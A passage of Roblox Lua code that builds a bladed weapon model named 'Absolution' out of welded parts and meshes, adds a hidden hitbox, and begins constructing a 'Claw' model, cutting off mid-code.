b11.Name = "Mesh"
b11.Scale = Vector3.new(0.550000012, 1, 0.550000012)
p12 = Instance.new("Part", m)
p12.Name = "BladeCenter"
p12.BrickColor = BrickColor.new("Dark stone grey")
p12.Material = Enum.Material.Concrete
p12.FormFactor = Enum.FormFactor.Symmetric
p12.Size = Vector3.new(1, 2, 2)
p12.CFrame = CFrame.new(67.4995346, 6.83217764, 72.2514038, -0.999972522, 2.42275873e-005, 0.000103325896, -8.39982677e-005, 4.44650614e-005, -0.999960959, -4.06451727e-005, -0.999940753, -1.25430051e-005)
p12.CanCollide = false
p12.Locked = true
p12.BottomSurface = Enum.SurfaceType.Smooth
p12.TopSurface = Enum.SurfaceType.Smooth
b12 = Instance.new("SpecialMesh", p12)
b12.MeshType = Enum.MeshType.Brick
b12.Name = "Mesh"
b12.Scale = Vector3.new(0.499999911, 1, 0.699999928)
p13 = Instance.new("Part", m)
p13.BrickColor = BrickColor.new("Institutional white")
p13.FormFactor = Enum.FormFactor.Custom
p13.Size = Vector3.new(2.91000009, 4.3300004, 1)
p13.CFrame = CFrame.new(67.5096359, 9.31026554, 73.9751816, 7.60371313e-006, 1.0943455e-005, 0.999972522, -0.119072244, -0.99284631, -7.55448127e-006, 0.992830038, -0.119038157, 1.01703836e-005)
p13.CanCollide = false
p13.Locked = true
p13.Elasticity = 0
p13.BottomSurface = Enum.SurfaceType.Smooth
p13.TopSurface = Enum.SurfaceType.Smooth
b13 = Instance.new("BlockMesh", p13)
b13.Name = "Mesh"
b13.Scale = Vector3.new(1, 1, 0.400000006)
p14 = Instance.new("Part", m)
p14.BrickColor = BrickColor.new("Institutional white")
p14.FormFactor = Enum.FormFactor.Custom
p14.Size = Vector3.new(2.5, 2.17999935, 1)
p14.CFrame = CFrame.new(67.4896011, 10.1621294, 72.6420059, -1.55498967e-007, -1.33476442e-005, 0.999972522, -0.462319613, 0.886669755, -7.56198779e-006, -0.886637092, -0.462338567, 1.01078904e-005)
p14.CanCollide = false
p14.Locked = true
p14.Elasticity = 0
p14.BottomSurface = Enum.SurfaceType.Smooth
p14.TopSurface = Enum.SurfaceType.Smooth
b14 = Instance.new("BlockMesh", p14)
b14.Name = "Mesh"
b14.Scale = Vector3.new(0.400000006, 1, 0.400000006)
p15 = Instance.new("Part", m)
p15.BrickColor = BrickColor.new("Institutional white")
p15.FormFactor = Enum.FormFactor.Custom
p15.Size = Vector3.new(1.16999996, 4.2699995, 1)
p15.CFrame = CFrame.new(67.5095901, 9.35303593, 70.6884613, -1.24399676e-005, -4.94209144e-006, 0.999972522, 0.645082474, 0.764063478, -7.52419282e-006, -0.764068604, 0.645045042, 1.0099785e-005)
p15.CanCollide = false
p15.Locked = true
p15.Elasticity = 0
p15.BottomSurface = Enum.SurfaceType.Smooth
p15.TopSurface = Enum.SurfaceType.Smooth
b15 = Instance.new("BlockMesh", p15)
b15.Name = "Mesh"
b15.Scale = Vector3.new(1, 1, 0.400000006)
p16 = Instance.new("Part", m)
p16.BrickColor = BrickColor.new("Institutional white")
p16.FormFactor = Enum.FormFactor.Custom
p16.Size = Vector3.new(1.68999994, 4.76000023, 1)
p16.CFrame = CFrame.new(67.4996033, 9.63990211, 75.3800278, 2.98175655e-006, 1.30014914e-005, 0.999972522, 0.258795738, -0.965893507, -7.53869244e-006, 0.965865672, 0.258821338, 1.01718706e-005)
p16.CanCollide = false
p16.Locked = true
p16.Elasticity = 0
p16.BottomSurface = Enum.SurfaceType.Smooth
p16.TopSurface = Enum.SurfaceType.Smooth
b16 = Instance.new("BlockMesh", p16)
b16.Name = "Mesh"
b16.Scale = Vector3.new(1, 1, 0.400000006)
p17 = Instance.new("Part", m)
p17.BrickColor = BrickColor.new("Institutional white")
p17.FormFactor = Enum.FormFactor.Custom
p17.Size = Vector3.new(1.78999996, 4.21999979, 1)
p17.CFrame = CFrame.new(67.499588, 9.28996372, 69.8789978, -9.50601952e-006, -9.41252802e-006, 0.999972522, 0.293352425, 0.955965877, -7.53842551e-006, -0.955955863, 0.293315947, 1.00904235e-005)
p17.CanCollide = false
p17.Locked = true
p17.Elasticity = 0
p17.BottomSurface = Enum.SurfaceType.Smooth
p17.TopSurface = Enum.SurfaceType.Smooth
b17 = Instance.new("BlockMesh", p17)
b17.Name = "Mesh"
b17.Scale = Vector3.new(1, 1, 0.400000006)
p18 = Instance.new("WedgePart", m)
p18.BrickColor = BrickColor.new("Dark stone grey")
p18.Name = "BladePart1"
p18.Material = Enum.Material.Concrete
p18.Name = "Wedge"
p18.FormFactor = Enum.FormFactor.Symmetric
p18.Size = Vector3.new(1, 4, 2)
p18.CFrame = CFrame.new(67.499321, 6.83199787, 69.4816895, 0.999972522, -3.68033288e-005, -4.22928351e-005, 2.29664256e-005, -1.65102574e-005, 0.999963701, -2.03872096e-005, -0.999943435, -4.84290831e-005)
p18.CanCollide = false
p18.Locked = true
p18.BottomSurface = Enum.SurfaceType.Smooth
p18.TopSurface = Enum.SurfaceType.Smooth
b18 = Instance.new("SpecialMesh", p18)
b18.MeshType = Enum.MeshType.Wedge
b18.Name = "Mesh"
b18.Scale = Vector3.new(0.499999911, 0.899999976, 0.699999928)
p19 = Instance.new("WedgePart", m)
p19.BrickColor = BrickColor.new("Dark stone grey")
p19.Name = "BladePart2"
p19.Material = Enum.Material.Concrete
p19.Name = "Wedge"
p19.FormFactor = Enum.FormFactor.Symmetric
p19.Size = Vector3.new(1, 4, 2)
p19.CFrame = CFrame.new(67.4994736, 6.83213568, 75.0314102, -0.999972522, 3.68059118e-005, -0.000103325001, -8.40002976e-005, -4.4521752e-005, 0.999963701, 2.03864402e-005, 0.999943435, 1.26029336e-005)
p19.CanCollide = false
p19.Locked = true
p19.BottomSurface = Enum.SurfaceType.Smooth
p19.TopSurface = Enum.SurfaceType.Smooth
b19 = Instance.new("SpecialMesh", p19)
b19.MeshType = Enum.MeshType.Wedge
b19.Name = "Mesh"
b19.Scale = Vector3.new(0.499999911, 0.899999976, 0.699999928)
p20 = Instance.new("Part", m)
p20.BrickColor = BrickColor.new("Institutional white")
p20.FormFactor = Enum.FormFactor.Custom
p20.Size = Vector3.new(2.53000021, 2.39999938, 1)
p20.CFrame = CFrame.new(67.4996414, 7.91898966, 71.4148178, -1.09432585e-005, 7.6432425e-006, 0.999972522, 0.992849231, -0.119072601, -7.55000656e-006, 0.119038492, 0.992832959, 1.01311334e-005)
p20.CanCollide = false
p20.Locked = true
p20.Elasticity = 0
p20.BottomSurface = Enum.SurfaceType.Smooth
p20.TopSurface = Enum.SurfaceType.Smooth
b20 = Instance.new("BlockMesh", p20)
b20.Name = "Mesh"
b20.Scale = Vector3.new(0.400000006, 1, 0.400000006)
p21 = Instance.new("Part", m)
p21.BrickColor = BrickColor.new("New Yeller")
p21.FormFactor = Enum.FormFactor.Custom
p21.Size = Vector3.new(1, 1.43999994, 1.59000015)
p21.CFrame = CFrame.new(67.509613, 9.57073689, 76.6228256, 0.999972522, -2.50856156e-005, -1.53699839e-005, -4.86196222e-005, -0.800835371, -0.598824739, 1.91311228e-005, 0.59883821, -0.800800025)
p21.CanCollide = false
p21.Locked = true
p21.Elasticity = 0
p21.BottomSurface = Enum.SurfaceType.Smooth
p21.TopSurface = Enum.SurfaceType.Smooth
b21 = Instance.new("SpecialMesh", p21)
b21.MeshType = Enum.MeshType.Wedge
b21.Name = "Mesh"
b21.Scale = Vector3.new(0.300000012, 0.600000024, 0.699999988)
w1 = Instance.new("Weld", p1)
w1.Name = "Part_Weld"
w1.Part0 = p1
w1.C0 = CFrame.new(-67.5030899, -72.5280457, -14.8209743, 1, -6.37466928e-006, 4.26825172e-005, -3.75621021e-005, 0.358411252, 0.933563769, -2.12490559e-005, -0.933563769, 0.358411252)
w1.Part1 = p2
w1.C1 = CFrame.new(9.14727688, -74.5847855, -67.5001221, -4.37113883e-008, 0.961261749, -0.27563718, 0, 0.27563718, 0.961261749, 1, 4.20180868e-008, -1.2048484e-008)
w2 = Instance.new("Weld", p2)
w2.Name = "Part_Weld"
w2.Part0 = p2
w2.C0 = CFrame.new(9.14727688, -74.5847855, -67.5001221, -4.37113883e-008, 0.961261749, -0.27563718, 0, 0.27563718, 0.961261749, 1, 4.20180868e-008, -1.2048484e-008)
w2.Part1 = p3
w2.C1 = CFrame.new(-67.5030823, -74.2541809, -10.8368053, 1, -8.59976626e-006, 4.22903977e-005, -3.75621021e-005, 0.30906105, 0.951042175, -2.12490559e-005, -0.951042175, 0.30906105)
w3 = Instance.new("Weld", p3)
w3.Name = "Part_Weld"
w3.Part0 = p3
w3.C0 = CFrame.new(-67.5030823, -74.2541809, -10.8368053, 1, -8.59976626e-006, 4.22903977e-005, -3.75621021e-005, 0.30906105, 0.951042175, -2.12490559e-005, -0.951042175, 0.30906105)
w3.Part1 = p4
w3.C1 = CFrame.new(-67.5002975, -36.1002579, 68.1035233, 1, -4.10709617e-005, 9.00123541e-006, -3.82823673e-005, -0.800855637, 0.598857403, -1.73869594e-005, -0.598857403, -0.800855637)
w4 = Instance.new("Weld", p4)
w4.Name = "Part_Weld"
w4.Part0 = p4
w4.C0 = CFrame.new(-67.5002975, -36.1002579, 68.1035233, 1, -4.10709617e-005, 9.00123541e-006, -3.82823673e-005, -0.800855637, 0.598857403, -1.73869594e-005, -0.598857403, -0.800855637)
w4.Part1 = p5
w4.C1 = CFrame.new(-67.5031891, -74.611969, -14.457736, 1, -6.37466928e-006, 4.26825172e-005, -3.75621021e-005, 0.358411252, 0.933563769, -2.12490559e-005, -0.933563769, 0.358411252)
w5 = Instance.new("Weld", p5)
w5.Name = "Part_Weld"
w5.Part0 = p5
w5.C0 = CFrame.new(-67.5031891, -74.611969, -14.457736, 1, -6.37466928e-006, 4.26825172e-005, -3.75621021e-005, 0.358411252, 0.933563769, -2.12490559e-005, -0.933563769, 0.358411252)
w5.Part1 = p6
w5.C1 = CFrame.new(-11.2799978, -66.1456223, -67.5023346, -4.37113883e-008, 1, 4.37113883e-008, 0, -4.37113883e-008, 1, 1, 4.37113883e-008, 1.91068547e-015)
w6 = Instance.new("Weld", p6)
w6.Name = "Part_Weld"
w6.Part0 = p6
w6.C0 = CFrame.new(-11.2799978, -66.1456223, -67.5023346, -4.37113883e-008, 1, 4.37113883e-008, 0, -4.37113883e-008, 1, 1, 4.37113883e-008, 1.91068547e-015)
w6.Part1 = p7
w6.C1 = CFrame.new(-67.5183792, -21.1694489, 74.0717163, 1, -3.97989206e-005, 1.13026372e-005, -4.09751265e-005, -0.91493088, 0.403610349, -5.72212457e-006, -0.403610349, -0.91493088)
w7 = Instance.new("Weld", p7)
w7.Name = "Part_Weld"
w7.Part0 = p7
w7.C0 = CFrame.new(-67.5183792, -21.1694489, 74.0717163, 1, -3.97989206e-005, 1.13026372e-005, -4.09751265e-005, -0.91493088, 0.403610349, -5.72212457e-006, -0.403610349, -0.91493088)
w7.Part1 = p8
w7.C1 = CFrame.new(-67.508461, -23.234499, 73.7728119, 1, -3.97989206e-005, 1.13026372e-005, -4.09751265e-005, -0.91493088, 0.403610349, -5.72212457e-006, -0.403610349, -0.91493088)
w8 = Instance.new("Weld", p8)
w8.Name = "Part_Weld"
w8.Part0 = p8
w8.C0 = CFrame.new(-67.508461, -23.234499, 73.7728119, 1, -3.97989206e-005, 1.13026372e-005, -4.09751265e-005, -0.91493088, 0.403610349, -5.72212457e-006, -0.403610349, -0.91493088)
w8.Part1 = p9
w8.C1 = CFrame.new(-72.2151413, -19.6674671, -67.5124359, -2.77766703e-005, 0.353263557, 0.935524285, -1.84533783e-005, -0.935524285, 0.353263557, 1, -7.4510931e-006, 3.25046385e-005)
w9 = Instance.new("Weld", p9)
w9.Name = "Part_Weld"
w9.Part0 = p9
w9.C0 = CFrame.new(-72.2151413, -19.6674671, -67.5124359, -2.77766703e-005, 0.353263557, 0.935524285, -1.84533783e-005, -0.935524285, 0.353263557, 1, -7.4510931e-006, 3.25046385e-005)
w9.Part1 = p10
w9.C1 = CFrame.new(67.0792923, -29.5803547, -67.4901428, -2.24114753e-008, 0.292369425, -0.956305802, 3.04095332e-010, 0.956305802, 0.292369425, 1, 6.26159258e-009, -2.15211493e-008)
w10 = Instance.new("Weld", p10)
w10.Name = "Part_Weld"
w10.Part0 = p10
w10.C0 = CFrame.new(67.0792923, -29.5803547, -67.4901428, -2.24114753e-008, 0.292369425, -0.956305802, 3.04095332e-010, 0.956305802, 0.292369425, 1, 6.26159258e-009, -2.15211493e-008)
w10.Part1 = p11
w10.C1 = CFrame.new(-62.9921722, 32.1197624, -67.5121918, -2.88835581e-005, -0.362230271, 0.932088912, 9.3476192e-006, -0.932088912, -0.362230271, 1, -1.74967965e-006, 3.03080251e-005)
w11 = Instance.new("Weld", p11)
w11.Name = "Part_Weld"
w11.Part0 = p11
w11.C0 = CFrame.new(-62.9921722, 32.1197624, -67.5121918, -2.88835581e-005, -0.362230271, 0.932088912, 9.3476192e-006, -0.932088912, -0.362230271, 1, -1.74967965e-006, 3.03080251e-005)
w11.Part1 = p12
w11.C1 = CFrame.new(67.5028763, 72.2527161, 6.8300252, -1, -9.15522687e-005, -3.05189751e-005, 3.05161811e-005, 3.05189751e-005, -1, 9.15532e-005, -1, -3.05161811e-005)
w12 = Instance.new("Weld", p12)
w12.Name = "Part_Weld"
w12.Part0 = p12
w12.C0 = CFrame.new(67.5028763, 72.2527161, 6.8300252, -1, -9.15522687e-005, -3.05189751e-005, 3.05161811e-005, 3.05189751e-005, -1, 9.15532e-005, -1, -3.05161811e-005)
w12.Part1 = p13
w12.C1 = CFrame.new(-72.3439255, 18.054121, -67.5101624, -4.09776035e-008, -0.11906305, 0.992886722, 4.05430745e-010, -0.992886722, -0.11906305, 1, -4.47637571e-009, 4.0734399e-008)
w13 = Instance.new("Weld", p13)
w13.Name = "Part_Weld"
w13.Part0 = p13
w13.C0 = CFrame.new(-72.3439255, 18.054121, -67.5101624, -4.09776035e-008, -0.11906305, 0.992886722, 4.05430745e-010, -0.992886722, -0.11906305, 1, -4.47637571e-009, 4.0734399e-008)
w13.Part1 = p14
w13.C1 = CFrame.new(69.1140671, 24.5752277, -67.4901428, -2.4837334e-008, -0.462350011, -0.886697888, 5.64353009e-010, 0.886697888, -0.462350011, 1, -1.19839818e-008, -2.17623022e-008)
w14 = Instance.new("Weld", p14)
w14.Name = "Part_Weld"
w14.Part0 = p14
w14.C0 = CFrame.new(69.1140671, 24.5752277, -67.4901428, -2.4837334e-008, -0.462350011, -0.886697888, 5.64353009e-010, 0.886697888, -0.462350011, 1, -1.19839818e-008, -2.17623022e-008)
w14.Part1 = p15
w14.C1 = CFrame.new(47.9809418, -52.7511749, -67.5101318, -3.94735267e-008, 0.64509654, -0.764101744, -4.55740418e-010, 0.764101744, 0.64509654, 1, 2.58124242e-008, -2.98677882e-008)
w15 = Instance.new("Weld", p15)
w15.Name = "Part_Weld"
w15.Part0 = p15
w15.C0 = CFrame.new(47.9809418, -52.7511749, -67.5101318, -3.94735267e-008, 0.64509654, -0.764101744, -4.55740418e-010, 0.764101744, 0.64509654, 1, 2.58124242e-008, -2.98677882e-008)
w15.Part1 = p16
w15.C1 = CFrame.new(-75.3105469, -10.1974039, -67.5001221, -4.37113883e-008, 0.258818924, 0.965925872, 0, -0.965925872, 0.258818924, 1, 1.13133343e-008, 4.22219593e-008)
w16 = Instance.new("Weld", p16)
w16.Name = "Part_Weld"
w16.Part0 = p16
w16.C0 = CFrame.new(-75.3105469, -10.1974039, -67.5001221, -4.37113883e-008, 0.258818924, 0.965925872, 0, -0.965925872, 0.258818924, 1, 1.13133343e-008, 4.22219593e-008)
w16.Part1 = p17
w16.C1 = CFrame.new(64.0820847, -29.3829937, -67.5001373, -4.09009289e-008, 0.293349952, -0.956005633, 4.38312497e-010, 0.956005633, 0.293349952, 1, 1.15792238e-008, -3.92300876e-008)
w17 = Instance.new("Weld", p17)
w17.Name = "Wedge_Weld"
w17.Part0 = p17
w17.C0 = CFrame.new(64.0820847, -29.3829937, -67.5001373, -4.09009289e-008, 0.293349952, -0.956005633, 4.38312497e-010, 0.956005633, 0.293349952, 1, 1.15792238e-008, -3.92300876e-008)
w17.Part1 = p18
w17.C1 = CFrame.new(-67.4979324, 69.4871521, -6.82958078, 1, 3.05171125e-005, -3.05180438e-005, -3.05171125e-005, -3.05180438e-005, -1, -3.05180438e-005, 1, -3.05171125e-005)
w18 = Instance.new("Weld", p18)
w18.Name = "Wedge_Weld"
w18.Part0 = p18
w18.C0 = CFrame.new(-67.4979324, 69.4871521, -6.82958078, 1, 3.05171125e-005, -3.05180438e-005, -3.05171125e-005, -3.05180438e-005, -1, -3.05180438e-005, 1, -3.05171125e-005)
w18.Part1 = p19
w18.C1 = CFrame.new(67.4982986, -75.0367737, -6.83008671, -1, -9.15532e-005, 3.05161811e-005, 3.05189751e-005, -3.05161811e-005, 1, -9.15522687e-005, 1, 3.05189751e-005)
w19 = Instance.new("Weld", p19)
w19.Name = "Part_Weld"
w19.Part0 = p19
w19.C0 = CFrame.new(67.4982986, -75.0367737, -6.83008671, -1, -9.15532e-005, 3.05161811e-005, 3.05189751e-005, -3.05161811e-005, 1, -9.15522687e-005, 1, 3.05189751e-005)
w19.Part1 = p20
w19.C1 = CFrame.new(-16.3677292, -69.9670334, -67.5001678, -1.77821063e-010, 0.992886961, 0.119063012, -1.46926671e-009, -0.119063012, 0.992886961, 1, 1.59595731e-012, 1.47997492e-009)
w20 = Instance.new("Weld", p20)
w20.Name = "Part_Weld"
w20.Part0 = p20
w20.C0 = CFrame.new(-16.3677292, -69.9670334, -67.5001678, -1.77821063e-010, 0.992886961, 0.119063012, -1.46926671e-009, -0.119063012, 0.992886961, 1, 1.59595731e-012, 1.47997492e-009)
w20.Part1 = p21
w20.C1 = CFrame.new(-67.5104218, -38.2193756, 67.100563, 1, -4.10709617e-005, 9.00123541e-006, -3.82823673e-005, -0.800855637, 0.598857403, -1.73869594e-005, -0.598857403, -0.800855637)
m.Parent = char
m:MakeJoints()
----------------------------------------------------
local cor = Instance.new("Part", char.Absolution)
cor.Name = "Thingy"
cor.Locked = true
cor.BottomSurface = 0
cor.CanCollide = false
cor.Size = Vector3.new(1, 13, 1)
cor.Transparency = 1
cor.TopSurface = 0
corw = Instance.new("Weld", cor)
corw.Part0 = rarm
corw.Part1 = cor
corw.C0 = CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))
corw.C1 = CFrame.new(0, 0, 0)
weld1 = Instance.new("Weld", char.Absolution)
weld1.Part0 = cor
weld1.Part1 = p6
weld1.C0 = CFrame.new(0, 0, 0)
----------------------------------------------------
hitb = Instance.new("Part", char.Absolution)
hitb.Name = "Thingy2"
hitb.Locked = true
hitb.BottomSurface = 0
hitb.CanCollide = false
hitb.Size = Vector3.new(0, 8, 6)
hitb.Transparency = 1
hitb.TopSurface = 0
weld2 = Instance.new("Weld", char.Absolution)
weld2.Part0 = hitb
weld2.Part1 = p12
weld2.C0 = CFrame.new(0, .6, 1)
----------------------------------------------------
local m = Instance.new("Model")
m.Name = "Claw"
p1 = Instance.new("Part", m)
p1.BrickColor = BrickColor.new("Institutional white")
p1.FormFactor = Enum.FormFactor.Custom
p1.Size = Vector3.new(1.5, 0.5, 0.5)
p1.CFrame = CFrame.new(2.91120553, 6.79703379, -19.5339718, -0.205515206, -0.209888965, 0.955883741, 0.52527827, -0.847774804, -0.0732159689, 0.825741529, 0.487057745, 0.284480691)
p1.CanCollide = false
p1.Locked = true
p1.BottomSurface = Enum.SurfaceType.Smooth
p1.TopSurface = Enum.SurfaceType.Smooth
b1 = Instance.new("BlockMesh", p1)
b1.Name = "Mesh"
p2 = Instance.new("WedgePart", m)
p2.BrickColor = BrickColor.new("Institutional white")
p2.Name = "Wedge"
p2.FormFactor = Enum.FormFactor.Custom
p2.Size = Vector3.new(3, 1, 0.5)
p2.CFrame = CFrame.new(2.94872427, 6.13246727, -16.5004997, -5.96046448e-008, -4.47034836e-008, -1.00000358, -1.3615936e-005, 0.99999994, 4.47034836e-008, 1.00000358, 1.41002238e-005, 0)
p2.CanCollide = false
p2.Locked = true
p2.BottomSurface = Enum.SurfaceType.Smooth
p2.TopSurface = Enum.SurfaceType.Smooth
p3 = Instance.new("Part", m)
p3.BrickColor = BrickColor.new("Institutional white")
p3.FormFactor = Enum.FormFactor.Custom
p3.Size = Vector3.new(1.5, 0.5, 0.5)
p3.CFrame = CFrame.new(1.84869456, 6.79700661, -18.5422173, -5.06400113e-008, 1.07230136e-007, 1.00000715, -0.499905825, -0.866079628, -1.1125789e-007, 0.86608547, -0.499910295, -2.17476881e-008)
p3.CanCollide = false
p3.Locked = true
p3.BottomSurface = Enum.SurfaceType.Smooth
p3.TopSurface = Enum.SurfaceType.Smooth
b2 = Instance.new("BlockMesh", p3)
b2.Name = "Mesh"
p4 = Instance.new("WedgePart", m)
p4.BrickColor = BrickColor.new("Institutional white")
p4.Name = "Wedge"
p4.FormFactor = Enum.FormFactor.Custom
p4.Size = Vector3.new(3, 1, 0.5)
p4.CFrame = CFrame.new(0.0487272739, 4.13279819, -16.5004959, -1.62921424e-007, 1.78814929e-007, 1.00001431, -1.2755394e-005, -0.999999762, -1.78813849e-007, 1.00001431, -1.46627426e-005, -7.54998553e-008)
p4.CanCollide = false
p4.Locked = true
p4.BottomSurface = Enum.SurfaceType.Smooth
p4.TopSurface = Enum.SurfaceType.Smooth
p5 = Instance.new("Part", m)
p5.BrickColor = BrickColor.new("Institutional white")
p5.FormFactor = Enum.FormFactor.Custom
p5.Size = Vector3.new(1.5, 0.5, 0.5)
p5.CFrame = CFrame.new(1.84874606, 6.79701567, -19.6422844, -4.29027068e-007, 1.9046513e-007, 1.00001431, 0.500089467, -0.865973532, 2.18601315e-008, 0.865987122, 0.50009501, 3.78533827e-008)
p5.CanCollide = false
p5.Locked = true
p5.BottomSurface = Enum.SurfaceType.Smooth
p5.TopSurface = Enum.SurfaceType.Smooth
b3 = Instance.new("BlockMesh", p5)
b3.Name = "Mesh"
p6 = Instance.new("Part", m)
p6.BrickColor = BrickColor.new("Institutional white")
p6.FormFactor = Enum.FormFactor.Custom
p6.Size = Vector3.new(1.5, 0.5, 0.5)
p6.CFrame = CFrame.new(2.61122823, 6.79701757, -18.433939, -0.250001401, 0.0669622123, 0.965941966, -0.491382152, -0.868364573, -0.0669801831, 0.834303975, -0.491393685, 0.249996051)
p6.CanCollide = false
p6.Locked = true
p6.BottomSurface = Enum.SurfaceType.Smooth
p6.TopSurface = Enum.SurfaceType.Smooth
b4 = Instance.new("BlockMesh", p6)
b4.Name = "Mesh"
p7 = Instance.new("Part", m)
p7.BrickColor = BrickColor.new("Institutional white")
p7.FormFactor = Enum.FormFactor.Custom
p7.Size = Vector3.new(3, 1, 1.20000005)
p7.CFrame = CFrame.new(2.59874034, 5.13276958, -16.5005379, -3.27825546e-007, -3.57627869e-007, -1.00001431, -0.000133868307, 0.99999994, 1.49011612e-008, 1.00001442, 0.000135900453, -5.96046448e-008)
p7.CanCollide = false
p7.Locked = true
p7.BottomSurface = Enum.SurfaceType.Smooth
p7.TopSurface = Enum.SurfaceType.Smooth
b5 = Instance.new("BlockMesh", p7)
b5.Name = "Mesh"
p8 = Instance.new("Part", m)
p8.BrickColor = BrickColor.new("New Yeller")
p8.FormFactor = Enum.FormFactor.Symmetric
p8.Size = Vector3.new(1, 1, 1)
p8.CFrame = CFrame.new(1.84841466, 6.25537968, -20.3997307, -1.42129729e-005, 0.00428489037, -1.00000513, 0.965967655, 0.258660465, 0.00109496934, 0.258668512, -0.965972245, -0.00414247159)
p8.CanCollide = false
p8.Locked = true
b6 = Instance.new("SpecialMesh", p8)
b6.MeshId = "http://www.roblox.com/Asset/?id=9756362"
b6.TextureId = ""
b6.MeshType = Enum.MeshType.FileMesh
b6.Name = "Mesh"
b6.Scale = Vector3.new(1.20000005, 0.449999988, 0.449999988)
p9 = Instance.new("Part", m)
p9.BrickColor = BrickColor.new("Institutional white")
p9.FormFactor = Enum.FormFactor.Custom
p9.Size = Vector3.new(1.5, 0.5, 0.5)
p9.CFrame = CFrame.new(2.79691935, 3.68131566, -18.264101, -0.277095288, -0.561500967, -0.779720128, 0.631033003, 0.505603611, -0.58835566, 0.724593103, -0.655058563, 0.214224264)
p9.CanCollide = false
p9.Locked = true
p9.BottomSurface = Enum.SurfaceType.Smooth
p9.TopSurface = Enum.SurfaceType.Smooth
b7 = Instance.new("BlockMesh", p9)
b7.Name = "Mesh"
p10 = Instance.new("Part", m)
p10.BrickColor = BrickColor.new("New Yeller")
p10.FormFactor = Enum.FormFactor.Symmetric
p10.Size = Vector3.new(1, 1, 1)
p10.CFrame = CFrame.new(3.09846497, 6.25236273, -20.2996788, -0.0669716895, 0.254178405, -0.964850724, 0.96595335, 0.258713901, 0.00110733509, 0.249903828, -0.93192625, -0.262850702)
p10.CanCollide = false
p10.Locked = true
b8 = Instance.new("SpecialMesh", p10)
b8.MeshId = "http://www.roblox.com/Asset/?id=9756362"
b8.TextureId = ""
b8.MeshType = Enum.MeshType.FileMesh
b8.Name = "Mesh"
b8.Scale = Vector3.new(1.20000005, 0.449999988, 0.449999988)
p11 = Instance.new("Part", m)
p11.BrickColor = BrickColor.new("Institutional white")
p11.FormFactor = Enum.FormFactor.Custom
p11.Size = Vector3.new(1.5, 0.5, 0.5)
p11.CFrame = CFrame.new(0.386122227, 6.79699421, -18.533905, 0.250022948, -0.0669473261, 0.965937555, -0.491377324, -0.868365645, 0.0670026764, 0.834300399, -0.491393894, -0.250007868)
p11.CanCollide = false
p11.Locked = true
p11.BottomSurface = Enum.SurfaceType.Smooth
p11.TopSurface = Enum.SurfaceType.Smooth
b9 = Instance.new("BlockMesh", p11)
b9.Name = "Mesh"
p12 = Instance.new("Part", m)
p12.BrickColor = BrickColor.new("Institutional white")
p12.FormFactor = Enum.FormFactor.Custom
p12.Size = Vector3.new(1.5, 0.5, 0.5)
p12.CFrame = CFrame.new(1.14871967, 6.79700947, -19.6422291, -4.76837158e-007, 2.83122063e-007, 1.00001442, 0.500089884, -0.865973473, 4.47034836e-008, 0.865987122, 0.500095367, 1.49011612e-008)
p12.CanCollide = false
p12.Locked = true
p12.BottomSurface = Enum.SurfaceType.Smooth
p12.TopSurface = Enum.SurfaceType.Smooth
b10 = Instance.new("BlockMesh", p12)
b10.Name = "Mesh"
p13 = Instance.new("Part", m)
p13.BrickColor = BrickColor.new("Institutional white")
p13.FormFactor = Enum.FormFactor.Custom
p13.Size = Vector3.new(1.5, 0.5, 0.5)
p13.CFrame = CFrame.new(1.14870512, 6.79699612, -18.5421638, -4.63888163e-008, 5.08347114e-007, 1.00001442, -0.499899268, -0.866083562, -2.18518963e-008, 0.866095126, -0.499908328, 3.78581007e-008)
p13.CanCollide = false
p13.Locked = true
p13.BottomSurface = Enum.SurfaceType.Smooth
p13.TopSurface = Enum.SurfaceType.Smooth
b11 = Instance.new("BlockMesh", p13)
b11.Name = "Mesh"
p14 = Instance.new("Part", m)
p14.BrickColor = BrickColor.new("New Yeller")
p14.FormFactor = Enum.FormFactor.Symmetric
p14.Size = Vector3.new(1, 1, 1)
p14.CFrame = CFrame.new(1.14845455, 6.25537348, -20.3996773, -1.42545232e-005, 0.00425684778, -1.00000536, 0.965958476, 0.258694947, 0.00108788908, 0.258703023, -0.965963125, -0.00411536777)
p14.CanCollide = false
p14.Locked = true
b12 = Instance.new("SpecialMesh", p14)
b12.MeshId = "http://www.roblox.com/Asset/?id=9756362"
b12.TextureId = ""
b12.MeshType = Enum.MeshType.FileMesh
b12.Name = "Mesh"
b12.Scale = Vector3.new(1.20000005, 0.449999988, 0.449999988)
p15 = Instance.new("Part", m)
p15.BrickColor = BrickColor.new("Medium stone grey")
p15.Transparency = 1
p15.Name = "ArmPart"
p15.FormFactor = Enum.FormFactor.Custom
p15.Size = Vector3.new(2, 1, 1)
p15.CFrame = CFrame.new(1.49875152, 5.13257265, -16.0004654, -2.99420208e-007, 4.39002179e-007, 1.00001442, 0.00011029192, -1, 0, 1.00001454, 0.000108176115, 4.42378223e-008)
p15.CanCollide = false
p15.Locked = true
p15.BottomSurface = Enum.SurfaceType.Smooth
p15.TopSurface = Enum.SurfaceType.Smooth
b13 = Instance.new("BlockMesh", p15)
b13.Name = "Mesh"
p16 = Instance.new("Part", m)
p16.BrickColor = BrickColor.new("Institutional white")
p16.FormFactor = Enum.FormFactor.Custom
p16.Size = Vector3.new(3, 1, 2.4000001)
p16.CFrame = CFrame.new(1.49872661, 6.13250732, -16.5007095, -2.98894406e-007, 4.39006953e-007, 1.00001442, 0.000110270419, -1, 4.71678729e-012, 1.00001454, 0.000108154614, 4.37120207e-008)
p16.CanCollide = false
p16.Locked = true
p16.BottomSurface = Enum.SurfaceType.Smooth
p16.TopSurface = Enum.SurfaceType.Smooth
b14 = Instance.new("BlockMesh", p16)
b14.Name = "Mesh"
p17 = Instance.new("Part", m)
p17.BrickColor = BrickColor.new("Institutional white")
p17.FormFactor = Enum.FormFactor.Custom
p17.Size = Vector3.new(1.5, 0.5, 0.5)
p17.CFrame = CFrame.new(2.77308726, 3.37837577, -19.2558823, 0.396035522, -0.497440547, -0.771840453, -0.207958207, 0.770127177, -0.603040278, 0.894391596, 0.399337679, 0.201549783)
p17.CanCollide = false
p17.Locked = true
p17.BottomSurface = Enum.SurfaceType.Smooth
p17.TopSurface = Enum.SurfaceType.Smooth
b15 = Instance.new("BlockMesh", p17)
b15.Name = "Mesh"
p18 = Instance.new("Part", m)
p18.BrickColor = BrickColor.new("New Yeller")
p18.FormFactor = Enum.FormFactor.Symmetric
p18.Size = Vector3.new(1, 1, 1)
